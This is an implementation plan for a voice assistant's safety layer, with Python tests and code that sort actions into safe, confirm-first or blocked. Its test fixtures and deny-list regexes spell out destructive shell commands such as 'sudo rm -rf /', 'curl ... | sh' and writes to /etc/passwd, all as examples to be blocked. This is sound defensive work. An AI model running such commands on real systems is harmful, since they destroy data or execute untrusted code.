# JARVIS General Agent — Foundations Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Land the safety policy module and refactor `server.py:handle_message` into a bounded micro-loop, so subsequent GUI/Computer-Use work has a stable foundation.

**Architecture:** A new pure-function module `safety.py` classifies each action as SAFE/CONFIRM/BLOCKED, with `is_affirmative`/`is_negative` helpers for parsing user replies. `server.py` is refactored so its dispatch path is a single bounded loop (`MAX_STEPS`, starting at 1, then raised to 5). Risky actions emit a spoken confirmation prompt and store a `PendingAction` keyed by WebSocket id; the next user turn resolves it.

**Tech Stack:** Python 3.11+, FastAPI, pytest, existing `LLMRouter` fake injection pattern.

**Spec:** `docs/specs/2026-05-11-general-agent-design.md` (sections "Safety Model", "Micro ReAct Loop", "Data Flow")

**Out of scope (deferred to follow-up plans):** `gui_actions.py`, `computer_use.py`, `[ACTION:UI:*]` and `[ACTION:COMPUTER:*]` tags, optional `step` WebSocket message, frontend changes.

---

## Phase 1 — Safety Module

### Task 1.1: Decision enum and reply parsers

**Files:**

- Create: `safety.py`
- Create: `tests/test_safety.py`

- [ ] **Step 1: Write failing tests**

Create `tests/test_safety.py`:

```python
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from safety import Decision, is_affirmative, is_negative  # noqa: E402


def test_decision_enum_has_three_members():
    assert {d.name for d in Decision} == {"SAFE", "CONFIRM", "BLOCKED"}  # nosec B101


def test_is_affirmative_english_tokens():
    for text in ("yes", "Yeah", "ok", "okay", "sure", "go ahead", "do it"):
        assert is_affirmative(text) is True, text  # nosec B101


def test_is_affirmative_korean_tokens():
    for text in ("응", "그래", "해줘", "맞아", "좋아"):
        assert is_affirmative(text) is True, text  # nosec B101


def test_is_affirmative_rejects_others():
    for text in ("", "no", "cancel", "maybe later", "thinking about it"):
        assert is_affirmative(text) is False, text  # nosec B101


def test_is_negative_english_tokens():
    for text in ("no", "Nope", "cancel that", "stop", "abort", "nevermind"):
        assert is_negative(text) is True, text  # nosec B101


def test_is_negative_korean_tokens():
    for text in ("아니", "아니야", "취소", "그만", "하지마"):
        assert is_negative(text) is True, text  # nosec B101


def test_is_negative_rejects_others():
    for text in ("", "yes", "sure", "응", "go"):
        assert is_negative(text) is False, text  # nosec B101
```

- [ ] **Step 2: Run tests and confirm they fail**

Run: `uv run pytest tests/test_safety.py -v`
Expected: `ModuleNotFoundError: No module named 'safety'`

- [ ] **Step 3: Create `safety.py` with minimal implementation**

```python
"""Action safety policy for JARVIS.

Pure-function module: no I/O, no LLM calls. Decisions are derived from the
action tag string and a small set of keyword tables. See
docs/specs/2026-05-11-general-agent-design.md for rationale.
"""

from __future__ import annotations

from enum import Enum


class Decision(Enum):
    SAFE = "safe"
    CONFIRM = "confirm"
    BLOCKED = "blocked"


_AFFIRMATIVE_TOKENS = (
    "yes",
    "yeah",
    "yep",
    "yup",
    "ok",
    "okay",
    "sure",
    "go ahead",
    "go",
    "do it",
    "응",
    "그래",
    "해",
    "해줘",
    "맞아",
    "좋아",
)

_NEGATIVE_TOKENS = (
    "no",
    "nope",
    "cancel",
    "stop",
    "abort",
    "nevermind",
    "never mind",
    "아니",
    "아니야",
    "취소",
    "그만",
    "하지마",
)


def _normalize(text: str) -> str:
    return text.strip().lower()


def is_affirmative(text: str) -> bool:
    norm = _normalize(text)
    if not norm:
        return False
    return any(token in norm for token in _AFFIRMATIVE_TOKENS)


def is_negative(text: str) -> bool:
    norm = _normalize(text)
    if not norm:
        return False
    return any(token in norm for token in _NEGATIVE_TOKENS)
```

- [ ] **Step 4: Run tests and confirm they pass**

Run: `uv run pytest tests/test_safety.py -v`
Expected: all 7 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add safety.py tests/test_safety.py
git commit -m "feat(safety): add Decision enum and affirmative/negative parsers"
```

---

### Task 1.2: classify() and reason()

**Files:**

- Modify: `safety.py`
- Modify: `tests/test_safety.py`

- [ ] **Step 1: Append failing tests for `classify` and `reason`**

Append to `tests/test_safety.py`:

```python
from safety import classify, reason  # noqa: E402


def test_classify_safe_read_kinds():
    cases = [
        "CALENDAR",
        "MAIL",
        "MAIL:SEARCH:invoices",
        "NOTES:LIST",
        "NOTES:READ:meeting",
        "BROWSE:https://example.com",
        "SEARCH:asyncio docs",
        "RECALL:alpha project",
        "TASK:LIST",
        "REMEMBER:Anna's birthday is March 4",
        "UI:OBSERVE",
        "UI:FOCUS:Google Chrome",
        "UI:SCROLL:down::3",
        "PLAN:trip to Seoul",
        "PLAN_ANSWER:trip::day 1; day 2",
    ]
    for action in cases:
        assert classify(action) is Decision.SAFE, action  # nosec B101


def test_classify_confirm_write_kinds():
    cases = [
        "NOTES:CREATE:meeting::body",
        "TASK:CREATE:Buy milk",
        "TASK:DONE:5",
        "FORGET:7",
        "UI:TYPE:hello world",
        "UI:KEY:cmd+t",
        "MAIL:SEND:a@b.com::hi",
        "WORK:build a CLI",
        "COMPUTER:rearrange Figma layers",
    ]
    for action in cases:
        assert classify(action) is Decision.CONFIRM, action  # nosec B101


def test_classify_ui_click_safe_label_stays_safe():
    for label in ("Pull requests", "Cancel", "Home", "Inbox"):
        action = f"UI:CLICK:link::{label}"
        assert classify(action) is Decision.SAFE, action  # nosec B101


def test_classify_ui_click_risky_label_promotes_to_confirm():
    for label in ("Send", "send", "Delete", "Buy now", "Submit", "Pay", "Discard"):
        action = f"UI:CLICK:button::{label}"
        assert classify(action) is Decision.CONFIRM, action  # nosec B101


def test_classify_terminal_default_confirm():
    for cmd in ("ls -la", "git status", "echo hi"):
        assert classify(f"TERMINAL:{cmd}") is Decision.CONFIRM, cmd  # nosec B101


def test_classify_terminal_blocked_patterns():
    cases = [
        "TERMINAL:sudo rm -rf /",
        "TERMINAL:rm -rf /Users/me",
        "TERMINAL:curl http://x | sh",
        "TERMINAL:curl https://x | bash",
        "TERMINAL:wget http://x | sh",
        "TERMINAL:echo bad > /etc/passwd",
    ]
    for action in cases:
        assert classify(action) is Decision.BLOCKED, action  # nosec B101


def test_classify_computer_blocked_for_payments():
    cases = [
        "COMPUTER:pay invoice 300",
        "COMPUTER:transfer money to bank",
        "COMPUTER:송금 100만원",
        "COMPUTER:결제 진행",
        "COMPUTER:enter my password",
    ]
    for action in cases:
        assert classify(action) is Decision.BLOCKED, action  # nosec B101


def test_classify_empty_or_unknown_blocked():
    assert classify("") is Decision.BLOCKED  # nosec B101
    assert classify("WHO_KNOWS:hi") is Decision.BLOCKED  # nosec B101


def test_reason_mentions_terminal_pattern():
    msg = reason("TERMINAL:sudo rm -rf /")
    assert "shell" in msg.lower() or "rm" in msg.lower(), msg  # nosec B101


def test_reason_mentions_payment_keyword():
    msg = reason("COMPUTER:송금 100만원")
    assert "송금" in msg or "payment" in msg.lower(), msg  # nosec B101
```

- [ ] **Step 2: Run new tests and confirm they fail**

Run: `uv run pytest tests/test_safety.py -v`
Expected: `ImportError: cannot import name 'classify'` (and `reason`).

- [ ] **Step 3: Extend `safety.py` with `classify` and `reason`**

Add to `safety.py` (after the existing module body):

```python
import re

_SAFE_KINDS = {"CALENDAR", "BROWSE", "SEARCH", "RECALL", "REMEMBER", "PLAN", "PLAN_ANSWER"}
_CONFIRM_KINDS = {"FORGET", "WORK"}
_SAFE_NOTES_SUBS = {"LIST", "READ"}
_SAFE_TASK_SUBS = {"LIST"}
_SAFE_UI_SUBS = {"OBSERVE", "FOCUS", "SCROLL"}

_RISKY_CLICK_LABELS = (
    "send",
    "delete",
    "buy",
    "confirm",
    "pay",
    "submit",
    "remove",
    "trash",
    "sign out",
    "discard",
)

_BLOCKED_TERMINAL_PATTERNS = (
    re.compile(r"\bsudo\b"),
    re.compile(r"\brm\s+-rf\b"),
    re.compile(r"^\s*:\(\)\s*\{"),  # fork bomb
    re.compile(r"curl[^|]*\|\s*(sh|bash|zsh)\b"),
    re.compile(r"wget[^|]*\|\s*(sh|bash|zsh)\b"),
    re.compile(r">\s*/(etc|System|usr|bin|sbin)/"),
)

_BLOCKED_COMPUTER_KEYWORDS = (
    "pay",
    "payment",
    "transfer",
    "bank",
    "password",
    "송금",
    "결제",
    "이체",
    "비밀번호",
)


def _split(action: str) -> tuple[str, str]:
    """Return (kind_upper, payload). payload is everything after the first colon."""
    if ":" not in action:
        return action.upper(), ""
    kind, _, payload = action.partition(":")
    return kind.upper(), payload


def classify(action: str) -> Decision:
    if not action:
        return Decision.BLOCKED
    kind, payload = _split(action)

    if kind == "MAIL":
        head = payload.upper()
        if head == "SEND" or head.startswith("SEND:"):
            return Decision.CONFIRM
        return Decision.SAFE

    if kind in _SAFE_KINDS:
        return Decision.SAFE

    if kind == "NOTES":
        sub = payload.partition(":")[0].upper() or "LIST"
        return Decision.SAFE if sub in _SAFE_NOTES_SUBS else Decision.CONFIRM

    if kind == "TASK":
        sub = payload.partition(":")[0].upper() or "LIST"
        return Decision.SAFE if sub in _SAFE_TASK_SUBS else Decision.CONFIRM

    if kind == "UI":
        sub, _, rest = payload.partition(":")
        sub_u = sub.upper()
        if sub_u in _SAFE_UI_SUBS:
            return Decision.SAFE
        if sub_u == "CLICK":
            _role, _sep, label = rest.partition("::")
            ll = label.lower()
            return Decision.CONFIRM if any(r in ll for r in _RISKY_CLICK_LABELS) else Decision.SAFE
        if sub_u in {"TYPE", "KEY"}:
            return Decision.CONFIRM
        return Decision.CONFIRM

    if kind == "TERMINAL":
        if any(p.search(payload) for p in _BLOCKED_TERMINAL_PATTERNS):
            return Decision.BLOCKED
        return Decision.CONFIRM

    if kind == "COMPUTER":
        goal = payload.lower()
        if any(k in goal for k in _BLOCKED_COMPUTER_KEYWORDS):
            return Decision.BLOCKED
        return Decision.CONFIRM

    if kind in _CONFIRM_KINDS:
        return Decision.CONFIRM

    return Decision.BLOCKED


def reason(action: str) -> str:
    kind, payload = _split(action)
    if kind == "TERMINAL":
        for p in _BLOCKED_TERMINAL_PATTERNS:
            if p.search(payload):
                return f"dangerous shell pattern: {p.pattern}"
    if kind == "COMPUTER":
        low = payload.lower()
        for k in _BLOCKED_COMPUTER_KEYWORDS:
            if k in low:
                return f"payment or credentials keyword: {k}"
    return f"unrecognized or unsafe action: {action}"
```

- [ ] **Step 4: Run all safety tests and confirm they pass**

Run: `uv run pytest tests/test_safety.py -v`
Expected: all tests PASS (including the 7 from Task 1.1).

- [ ] **Step 5: Commit**

```bash
git add safety.py tests/test_safety.py
git commit -m "feat(safety): add classify() and reason() with table-driven rules"
```

---

## Phase 2 — Micro-Loop With `MAX_STEPS = 1`

The goal is to refactor `handle_message` into a bounded loop that today runs at most once. Wire `safety.classify` into the dispatch path; risky actions store a `PendingAction` and ask the user to confirm. Behavior change: actions previously executed without confirmation (`NOTES:CREATE`, `TASK:CREATE`, `TASK:DONE`, `FORGET`, `WORK`, `TERMINAL`) now require a voice "yes".

### Task 2.1: `PendingAction` dataclass and `_pending` registry

**Files:**

- Modify: `server.py` (top-level, near other module state)
- Create: `tests/test_server_pending.py`

- [ ] **Step 1: Write failing tests**

Create `tests/test_server_pending.py`:

```python
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import server  # noqa: E402
from server import PendingAction  # noqa: E402


def test_pending_action_not_expired_when_fresh():
    p = PendingAction(action="MAIL:SEND:a::hi", history=[], asked_at=time.time())
    assert p.expired() is False  # nosec B101


def test_pending_action_expired_after_window():
    p = PendingAction(
        action="MAIL:SEND:a::hi",
        history=[],
        asked_at=time.time() - 60.0,
        expires_in=30.0,
    )
    assert p.expired() is True  # nosec B101


def test_pending_registry_exists_and_is_empty_by_default():
    assert hasattr(server, "_pending")  # nosec B101
    server._pending.clear()
    assert server._pending == {}  # nosec B101
```

- [ ] **Step 2: Run and confirm failure**

Run: `uv run pytest tests/test_server_pending.py -v`
Expected: `ImportError: cannot import name 'PendingAction'`.

- [ ] **Step 3: Add `PendingAction` and `_pending` to `server.py`**

Near the top of `server.py` (after existing imports, before `ACTION_RE`):

```python
import time
from dataclasses import dataclass


@dataclass
class PendingAction:
    action: str
    history: list[dict]
    asked_at: float
    expires_in: float = 30.0

    def expired(self) -> bool:
        return time.time() - self.asked_at > self.expires_in


_pending: dict[str, PendingAction] = {}
```

- [ ] **Step 4: Run and confirm pass**

Run: `uv run pytest tests/test_server_pending.py -v`
Expected: 3 tests PASS.

- [ ] **Step 5: Commit**

```bash
git add server.py tests/test_server_pending.py
git commit -m "feat(server): add PendingAction dataclass and _pending registry"
```

---

### Task 2.2: Extract `_run_action_loop` helper (still MAX_STEPS=1, no safety yet)

This task is a **pure refactor**: extract the "router call + dispatch + history append" sequence into a reusable function, keeping `MAX_STEPS = 1`. No behavior change yet — `safety.classify` is wired in Task 2.3.

**Files:**

- Modify: `server.py`
- Create: `tests/test_server_loop.py`

- [ ] **Step 1: Write failing tests for the helper**

Create `tests/test_server_loop.py`:

```python
import asyncio
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

import server  # noqa: E402


def run(coro):
    return asyncio.run(coro)


class FakeRouter:
    """Returns scripted responses one at a time."""

    def __init__(self, responses):
        self.responses = list(responses)
        self.calls = []

    async def complete(self, *, task, messages, system, max_tokens):
        self.calls.append({"task": task, "messages": list(messages)})
        return self.responses.pop(0)


def test_action_loop_natural_termination_no_action_tag(monkeypatch):
    fake = FakeRouter(["Just a chat reply."])
    monkeypatch.setattr(server, "_router", fake)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "hi"}],
            system="sys",
            task="voice",
            max_steps=1,
        )
    )
    assert raw == "Just a chat reply."  # nosec B101
    assert steps == []  # nosec B101
    assert pending is None  # nosec B101


def test_action_loop_runs_one_safe_action(monkeypatch):
    fake = FakeRouter(["Checking. [ACTION:CALENDAR]"])
    monkeypatch.setattr(server, "_router", fake)

    async def fake_dispatch(tag):
        assert tag == "CALENDAR"  # nosec B101
        return "no events today"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "any meetings?"}],
            system="sys",
            task="voice",
            max_steps=1,
        )
    )
    assert pending is None  # nosec B101
    assert steps == [("CALENDAR", "no events today")]  # nosec B101


def test_action_loop_max_steps_one_stops_after_first_action(monkeypatch):
    fake = FakeRouter(
        [
            "Step 1. [ACTION:CALENDAR]",
            "Step 2. [ACTION:CALENDAR]",  # should NOT be reached at max_steps=1
        ]
    )
    monkeypatch.setattr(server, "_router", fake)

    async def fake_dispatch(tag):
        return "result"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "x"}],
            system="sys",
            task="voice",
            max_steps=1,
        )
    )
    assert len(steps) == 1  # nosec B101
    assert len(fake.responses) == 1  # one unused — confirms loop stopped  # nosec B101
```

- [ ] **Step 2: Run and confirm failure**

Run: `uv run pytest tests/test_server_loop.py -v`
Expected: `AttributeError: module 'server' has no attribute '_run_action_loop'`.

- [ ] **Step 3: Add `_run_action_loop` to `server.py`**

Add (above `handle_message`):

```python
async def _run_action_loop(
    *,
    messages: list[dict],
    system: str,
    task: str,
    max_steps: int,
) -> tuple[str, list[tuple[str, str]], PendingAction | None]:
    """Run a bounded ReAct loop.

    Returns (final_raw_from_last_call, executed_steps, pending_for_confirm).
    Termination: (a) LLM returns no action tag, (b) max_steps reached.
    Safety classification is wired in a later task — this version always
    executes the action when a tag is present.
    """
    history = list(messages)
    steps: list[tuple[str, str]] = []
    raw = ""
    for _ in range(max_steps):
        raw = await _router.complete(
            task=task,
            messages=history,
            system=system,
            max_tokens=250,
        )
        m = ACTION_RE.search(raw)
        if not m:
            return raw, steps, None
        tag = m.group(1)
        try:
            result = await dispatch_action(tag)
        except Exception as e:  # noqa: BLE001
            log.error("Action dispatch error: %s", e)
            result = "Action failed."
        steps.append((tag, result))
        history = history + [
            {"role": "assistant", "content": raw},
            {"role": "user", "content": f"[SYSTEM RESULT]\n{result}"},
        ]
    return raw, steps, None
```

- [ ] **Step 4: Run loop tests and confirm pass**

Run: `uv run pytest tests/test_server_loop.py -v`
Expected: 3 tests PASS.

- [ ] **Step 5: Commit (do not yet call the new helper from `handle_message`)**

```bash
git add server.py tests/test_server_loop.py
git commit -m "refactor(server): extract _run_action_loop helper (unused)"
```

---

### Task 2.3: Wire `_run_action_loop` into `handle_message`

**Files:**

- Modify: `server.py` (`handle_message` body)

- [ ] **Step 1: Add a test that pins current behavior end-to-end**

Append to `tests/test_server_loop.py`:

```python
class FakeTTS:
    """Stub for synthesize() — returns silence."""

    async def __call__(self, text):
        return b""


def test_handle_message_dispatches_safe_action(monkeypatch):
    fake_router = FakeRouter(["Checking. [ACTION:CALENDAR]", "No events today."])
    monkeypatch.setattr(server, "_router", fake_router)

    async def fake_dispatch(tag):
        assert tag == "CALENDAR"  # nosec B101
        return "0 events"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    async def fake_synth(_):
        return b""

    monkeypatch.setattr(server, "synthesize", fake_synth)

    class FakeWS:
        def __init__(self):
            self.sent = []

        async def send_json(self, msg):
            self.sent.append(msg)

    ws = FakeWS()
    run(server.handle_message(ws, "any meetings?"))

    types = [m["type"] for m in ws.sent]
    assert "thinking" in types  # nosec B101
    assert "text" in types  # nosec B101
    assert types[-1] == "done"  # nosec B101
    text_msg = next(m for m in ws.sent if m["type"] == "text")
    assert "No events today" in text_msg["content"]  # nosec B101
```

- [ ] **Step 2: Run and confirm it currently passes against the old `handle_message`**

Run: `uv run pytest tests/test_server_loop.py::test_handle_message_dispatches_safe_action -v`
Expected: PASS (the existing code already handles this path).

- [ ] **Step 3: Replace `handle_message` body to use `_run_action_loop`**

Replace the body of `handle_message` in `server.py` with:

```python
async def handle_message(ws: WebSocket, text: str) -> None:
    await ws.send_json({"type": "thinking"})
    messages = _mem.get_recent()
    messages.append({"role": "user", "content": text})

    try:
        raw, steps, pending = await _run_action_loop(
            messages=messages,
            system=_build_system_prompt(),
            task=_task_type(text),
            max_steps=1,
        )
    except Exception as e:  # noqa: BLE001
        log.error("LLM router error: %s", e)
        await ws.send_json({"type": "error", "message": "LLM provider error"})
        return

    spoken = ACTION_RE.sub("", raw).strip()

    if steps:
        follow_msgs = list(messages) + [
            {"role": "assistant", "content": raw},
            {
                "role": "user",
                "content": (
                    f"[SYSTEM RESULT]\n{steps[-1][1]}\n\n"
                    "Narrate in 1-2 sentences."
                ),
            },
        ]
        try:
            spoken = await _router.complete(
                task="narrate",
                messages=follow_msgs,
                system=_build_system_prompt(),
                max_tokens=150,
            )
        except Exception:  # noqa: BLE001
            spoken = steps[-1][1]

    _mem.add_exchange("user", text)
    _mem.add_exchange("assistant", spoken)

    await ws.send_json({"type": "text", "content": spoken})

    audio = await synthesize(spoken)
    await _send_audio_chunks(ws, audio)

    await ws.send_json({"type": "done"})
```

- [ ] **Step 4: Run the full test suite**

Run: `uv run pytest -v`
Expected: all tests PASS — `tests/test_server.py` already exercises `handle_message`-shaped behavior; combined with the new loop test, behavior parity is preserved at `max_steps=1`.

- [ ] **Step 5: Commit**

```bash
git add server.py tests/test_server_loop.py
git commit -m "refactor(server): route handle_message through _run_action_loop"
```

---

### Task 2.4: Wire `safety.classify` into the loop (CONFIRM path)

**Files:**

- Modify: `server.py` (`_run_action_loop`, `handle_message`)

- [ ] **Step 1: Add failing tests for CONFIRM and BLOCKED paths**

Append to `tests/test_server_loop.py`:

```python
def test_action_loop_confirm_returns_pending(monkeypatch):
    fake = FakeRouter(["Sending. [ACTION:MAIL:SEND:a@b.com::hi]"])
    monkeypatch.setattr(server, "_router", fake)

    async def must_not_be_called(tag):
        raise AssertionError(f"dispatch should not run for CONFIRM, got {tag}")

    monkeypatch.setattr(server, "dispatch_action", must_not_be_called)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "send mail to a"}],
            system="sys",
            task="voice",
            max_steps=1,
        )
    )
    assert pending is not None  # nosec B101
    assert pending.action == "MAIL:SEND:a@b.com::hi"  # nosec B101
    assert steps == []  # nosec B101


def test_action_loop_blocked_records_step_and_continues(monkeypatch):
    fake = FakeRouter(
        [
            "Running. [ACTION:TERMINAL:sudo rm -rf /]",
            "I'll stop here.",
        ]
    )
    monkeypatch.setattr(server, "_router", fake)

    async def must_not_be_called(tag):
        raise AssertionError("dispatch should not run for BLOCKED")

    monkeypatch.setattr(server, "dispatch_action", must_not_be_called)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "wipe disk"}],
            system="sys",
            task="voice",
            max_steps=2,
        )
    )
    assert pending is None  # nosec B101
    assert len(steps) == 1  # nosec B101
    assert steps[0][0] == "TERMINAL:sudo rm -rf /"  # nosec B101
    assert "blocked" in steps[0][1].lower()  # nosec B101


def test_handle_message_confirm_emits_pending_and_no_dispatch(monkeypatch):
    fake_router = FakeRouter(["Sending. [ACTION:MAIL:SEND:a@b.com::hi]"])
    monkeypatch.setattr(server, "_router", fake_router)

    async def must_not_be_called(_):
        raise AssertionError("dispatch must not run for CONFIRM")

    monkeypatch.setattr(server, "dispatch_action", must_not_be_called)

    async def fake_synth(_):
        return b""

    monkeypatch.setattr(server, "synthesize", fake_synth)

    server._pending.clear()

    class FakeWS:
        def __init__(self):
            self.sent = []

        async def send_json(self, msg):
            self.sent.append(msg)

    ws = FakeWS()
    run(server.handle_message(ws, "send mail to a"))

    assert len(server._pending) == 1  # nosec B101
    text_msg = next(m for m in ws.sent if m["type"] == "text")
    assert "?" in text_msg["content"] or "proceed" in text_msg["content"].lower()  # nosec B101
```

- [ ] **Step 2: Run and confirm the new tests fail**

Run: `uv run pytest tests/test_server_loop.py -v`
Expected: the three new tests fail (dispatch is still called for CONFIRM).

- [ ] **Step 3: Wire safety into `_run_action_loop`**

Replace the body of `_run_action_loop` with:

```python
async def _run_action_loop(
    *,
    messages: list[dict],
    system: str,
    task: str,
    max_steps: int,
) -> tuple[str, list[tuple[str, str]], PendingAction | None]:
    import safety  # local import to keep top-of-file lean

    history = list(messages)
    steps: list[tuple[str, str]] = []
    raw = ""
    for _ in range(max_steps):
        raw = await _router.complete(
            task=task,
            messages=history,
            system=system,
            max_tokens=250,
        )
        m = ACTION_RE.search(raw)
        if not m:
            return raw, steps, None
        tag = m.group(1)
        decision = safety.classify(tag)
        if decision is safety.Decision.CONFIRM:
            pending = PendingAction(
                action=tag,
                history=history,
                asked_at=time.time(),
            )
            return raw, steps, pending
        if decision is safety.Decision.BLOCKED:
            result = f"blocked: {safety.reason(tag)}"
        else:
            try:
                result = await dispatch_action(tag)
            except Exception as e:  # noqa: BLE001
                log.error("Action dispatch error: %s", e)
                result = "Action failed."
        steps.append((tag, result))
        history = history + [
            {"role": "assistant", "content": raw},
            {"role": "user", "content": f"[SYSTEM RESULT]\n{result}"},
        ]
    return raw, steps, None
```

- [ ] **Step 4: Handle the pending path in `handle_message`**

Add a helper near `handle_message` and update its body:

```python
def _format_confirm_prompt(raw: str, action: str) -> str:
    prose = ACTION_RE.sub("", raw).strip()
    if prose:
        return f"{prose} 진행할까요? / Proceed? (yes/no)"
    return f"Run action `{action}`? Say yes or no."


def _ws_id(ws: WebSocket) -> str:
    return f"{id(ws):x}"
```

In `handle_message`, after the `await _run_action_loop(...)` call and before the spoken/steps handling, insert:

```python
    if pending is not None:
        _pending[_ws_id(ws)] = pending
        spoken = _format_confirm_prompt(raw, pending.action)
        _mem.add_exchange("user", text)
        _mem.add_exchange("assistant", spoken)
        await ws.send_json({"type": "text", "content": spoken})
        audio = await synthesize(spoken)
        await _send_audio_chunks(ws, audio)
        await ws.send_json({"type": "done"})
        return
```

- [ ] **Step 5: Run all tests**

Run: `uv run pytest -v`
Expected: all tests PASS, including the three new CONFIRM/BLOCKED cases.

- [ ] **Step 6: Commit**

```bash
git add server.py tests/test_server_loop.py
git commit -m "feat(server): route risky actions through safety with pending confirmation"
```

---

### Task 2.5: Resolve pending action on the next user turn

**Files:**

- Modify: `server.py` (`handle_message`)

- [ ] **Step 1: Add failing tests for affirmative/negative/expired resolution**

Append to `tests/test_server_loop.py`:

```python
def test_handle_message_pending_yes_executes_action(monkeypatch):
    fake_router = FakeRouter(["Mail sent."])  # narrate pass
    monkeypatch.setattr(server, "_router", fake_router)

    called = {}

    async def fake_dispatch(tag):
        called["tag"] = tag
        return "sent"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    async def fake_synth(_):
        return b""

    monkeypatch.setattr(server, "synthesize", fake_synth)

    class FakeWS:
        def __init__(self):
            self.sent = []

        async def send_json(self, msg):
            self.sent.append(msg)

    ws = FakeWS()
    server._pending.clear()
    server._pending[server._ws_id(ws)] = server.PendingAction(
        action="MAIL:SEND:a@b.com::hi",
        history=[{"role": "user", "content": "send mail"}],
        asked_at=__import__("time").time(),
    )

    run(server.handle_message(ws, "yes"))

    assert called["tag"] == "MAIL:SEND:a@b.com::hi"  # nosec B101
    assert server._pending == {}  # nosec B101


def test_handle_message_pending_no_cancels(monkeypatch):
    monkeypatch.setattr(server, "_router", FakeRouter([]))

    async def must_not_be_called(_):
        raise AssertionError("dispatch must not run on cancellation")

    monkeypatch.setattr(server, "dispatch_action", must_not_be_called)

    async def fake_synth(_):
        return b""

    monkeypatch.setattr(server, "synthesize", fake_synth)

    class FakeWS:
        def __init__(self):
            self.sent = []

        async def send_json(self, msg):
            self.sent.append(msg)

    ws = FakeWS()
    server._pending.clear()
    server._pending[server._ws_id(ws)] = server.PendingAction(
        action="MAIL:SEND:a@b.com::hi",
        history=[],
        asked_at=__import__("time").time(),
    )

    run(server.handle_message(ws, "no, cancel"))

    text_msg = next(m for m in ws.sent if m["type"] == "text")
    assert "cancel" in text_msg["content"].lower() or "취소" in text_msg["content"]  # nosec B101
    assert server._pending == {}  # nosec B101


def test_handle_message_pending_expired_falls_through(monkeypatch):
    import time as _time

    fake_router = FakeRouter(["Just chatting."])
    monkeypatch.setattr(server, "_router", fake_router)

    async def must_not_be_called(_):
        raise AssertionError("expired pending must not dispatch")

    monkeypatch.setattr(server, "dispatch_action", must_not_be_called)

    async def fake_synth(_):
        return b""

    monkeypatch.setattr(server, "synthesize", fake_synth)

    class FakeWS:
        def __init__(self):
            self.sent = []

        async def send_json(self, msg):
            self.sent.append(msg)

    ws = FakeWS()
    server._pending.clear()
    server._pending[server._ws_id(ws)] = server.PendingAction(
        action="MAIL:SEND:a@b.com::hi",
        history=[],
        asked_at=_time.time() - 120.0,
        expires_in=30.0,
    )

    run(server.handle_message(ws, "anyway, what's the weather"))

    assert server._pending == {}  # nosec B101
    text_msg = next(m for m in ws.sent if m["type"] == "text")
    assert "Just chatting" in text_msg["content"]  # nosec B101
```

- [ ] **Step 2: Run and confirm failure**

Run: `uv run pytest tests/test_server_loop.py -v`
Expected: the three new tests fail (no pending resolution yet).

- [ ] **Step 3: Add pending-resolution prologue to `handle_message`**

Just inside `handle_message`, before the `_router`/`_run_action_loop` call, insert:

```python
    import safety  # local import

    wsid = _ws_id(ws)
    pending_existing = _pending.pop(wsid, None)
    if pending_existing is not None and not pending_existing.expired():
        if safety.is_affirmative(text):
            try:
                result = await dispatch_action(pending_existing.action)
            except Exception as e:  # noqa: BLE001
                log.error("Confirmed action failed: %s", e)
                result = "Action failed."
            follow_msgs = pending_existing.history + [
                {
                    "role": "user",
                    "content": f"[SYSTEM RESULT]\n{result}\n\nNarrate in 1-2 sentences.",
                },
            ]
            try:
                spoken = await _router.complete(
                    task="narrate",
                    messages=follow_msgs,
                    system=_build_system_prompt(),
                    max_tokens=150,
                )
            except Exception:  # noqa: BLE001
                spoken = result
            _mem.add_exchange("user", text)
            _mem.add_exchange("assistant", spoken)
            await ws.send_json({"type": "text", "content": spoken})
            audio = await synthesize(spoken)
            await _send_audio_chunks(ws, audio)
            await ws.send_json({"type": "done"})
            return
        if safety.is_negative(text):
            spoken = "Cancelled. / 취소했어요."
            _mem.add_exchange("user", text)
            _mem.add_exchange("assistant", spoken)
            await ws.send_json({"type": "text", "content": spoken})
            audio = await synthesize(spoken)
            await _send_audio_chunks(ws, audio)
            await ws.send_json({"type": "done"})
            return
        # neither yes nor no — drop pending, fall through to normal handling
```

(The `_pending.pop` already happened above, so on fall-through the pending is gone.)

- [ ] **Step 4: Run all tests**

Run: `uv run pytest -v`
Expected: all tests PASS.

- [ ] **Step 5: Compile-check and commit**

Run: `uv run python -m compileall server.py safety.py`
Expected: no errors.

```bash
git add server.py tests/test_server_loop.py
git commit -m "feat(server): resolve pending actions on next user turn"
```

---

## Phase 3 — Raise `MAX_STEPS` to 5

The loop already supports multi-step; we just bump the cap and add safety nets for repeats and the ceiling case.

### Task 3.1: Multi-step happy path test

**Files:**

- Modify: `tests/test_server_loop.py`

- [ ] **Step 1: Add failing test (still fails because the loop is hardcoded to 1)**

Append to `tests/test_server_loop.py`:

```python
def test_action_loop_runs_two_safe_steps(monkeypatch):
    fake = FakeRouter(
        [
            "Focusing. [ACTION:UI:FOCUS:Chrome]",
            "Searching. [ACTION:SEARCH:python asyncio]",
            "Found docs about asyncio.",
        ]
    )
    monkeypatch.setattr(server, "_router", fake)

    async def fake_dispatch(tag):
        return f"ran {tag}"

    monkeypatch.setattr(server, "dispatch_action", fake_dispatch)

    raw, steps, pending = run(
        server._run_action_loop(
            messages=[{"role": "user", "content": "look up asyncio"}],
            system="sys",
            task="voice",
            max_steps=5,
        )
    )
    assert pending is None  # nosec B101
    assert [s[0] for s in steps] == [
        "UI:FOCUS:Chrome",
        "SEARCH:python asyncio",
    ]  # nosec B101
    assert raw == "Found docs about asyncio."  # nosec B101
```

